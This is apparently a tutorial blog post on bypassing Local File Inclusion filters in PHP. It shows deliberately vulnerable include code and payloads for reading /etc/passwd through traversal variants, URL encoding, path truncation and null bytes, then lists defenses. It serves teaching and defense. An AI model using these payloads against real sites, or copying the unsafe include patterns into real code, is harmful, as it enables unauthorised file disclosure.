---
title: "LFI 101 - Basic Bypass Techniques"
seoTitle: "Basic LFI Bypass Techniques"
seoDescription: "Learn basic Local File Inclusion (LFI) bypass techniques and how to defend against them in PHP applications"
datePublished: Wed May 15 2024 05:09:01 GMT+0000 (Coordinated Universal Time)
cuid: clw7d3ha4000109miguuw3jzs
slug: lfi-101-basic-bypass-techniques

---

## 1\. Non-Recursive Path Traversal Filters

### Detailed Example

Let's consider a vulnerable PHP script that attempts to filter `../` sequences:

```php
$language = str_replace('../', '', $_GET['language']);
include('./languages/' . $language);

```

If an attacker provides the following payload:

```plaintext
....//....//....//....//etc/passwd

```

The `str_replace` function will remove the first `../`, resulting in:

```plaintext
..//....//....//....//etc/passwd

```

This payload still contains `../` sequences, allowing the attacker to traverse to the `/etc/passwd` file.

### Variations

Attackers can use various combinations of `../` and `./` to bypass non-recursive filters:

* `..././`
    
* `....\\/`
    
* `....////`
    

The key is to use patterns that, when filtered once, still result in valid `../` sequences.

## 2\. Encoding Techniques

### Detailed Example

Consider a PHP script that includes a file based on user input:

```php
include($_GET['language']);

```

If the application blocks `.` and `/` characters, an attacker can use URL encoding to bypass the filter:

```plaintext
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64

```

When decoded, this payload translates to:

```plaintext
../../../../etc/passwd

```

### Variations

Attackers can use double URL encoding to bypass more complex filters. For example:

* `../` can be double-encoded as `%252e%252e%252f`
    
* `.` can be double-encoded as `%252e`
    
* `/` can be double-encoded as `%252f`
    

## 3\. Approved Path Bypasses

### Detailed Example

Let's consider a PHP script that validates the included file path:

```php
if(preg_match('/^\\.\\/languages\\/.+$/', $_GET['language'])) {
    include($_GET['language']);
} else {
    echo 'Illegal path specified!';
}

```

To bypass this validation, an attacker can start their payload with the approved path and then traverse to the desired file:

```plaintext
./languages/../../../../etc/passwd

```

The payload starts with `./languages/`, satisfying the regular expression, but then uses `../` sequences to reach the `/etc/passwd` file.

### Variations

Attackers can combine approved path bypasses with encoding or recursive techniques:

* `./languages/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64`
    
* `./languages/....//....//....//....//etc/passwd`
    

## 4\. Path Truncation (PHP &lt; 5.3)

### Detailed Example

In PHP versions prior to 5.3, a payload like the following could be used to bypass appended extensions:

```plaintext
non_existing_directory/../../../etc/passwd/./././.[./ REPEATED ~2048 times].php

```

The repeated `./` sequences cause the payload to exceed the maximum string length of 4096 characters. When truncated, the `.php` extension is removed, resulting in a valid path to the `/etc/passwd` file.

### Generating Long Payloads

Attackers can use scripts or command-line techniques to generate long payloads:

```bash
echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done

```

This command generates a payload with 2048 repetitions of `./`.

## 5\. Null Byte Injection (PHP &lt; 5.5)

### Detailed Example

In PHP versions prior to 5.5, null byte injection could be used to bypass appended extensions:

```plaintext
../../../../etc/passwd%00

```

When this payload is appended with `.php`, the resulting path is:

```plaintext
../../../../etc/passwd%00.php

```

The null byte (`%00`) terminates the string, effectively removing the `.php` extension.

### Variations

Null bytes can be used in combination with other techniques:

* `./languages/../../../../etc/passwd%00`
    
* `%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64%00`
    

## Conclusion

These detailed examples demonstrate the various ways attackers can craft payloads to bypass LFI protections. It's essential for developers to be aware of these techniques and implement robust defenses, such as:

* Recursive filtering of `../` sequences
    
* Proper decoding and sanitization of user input
    
* Strict validation of file paths against a whitelist of allowed directories and files
    
* Updating to the latest versions of PHP and other server-side technologies to avoid vulnerabilities like null byte injection and path truncation
    

By understanding and mitigating these bypass techniques, developers can significantly reduce the risk of successful LFI attacks on their web applications.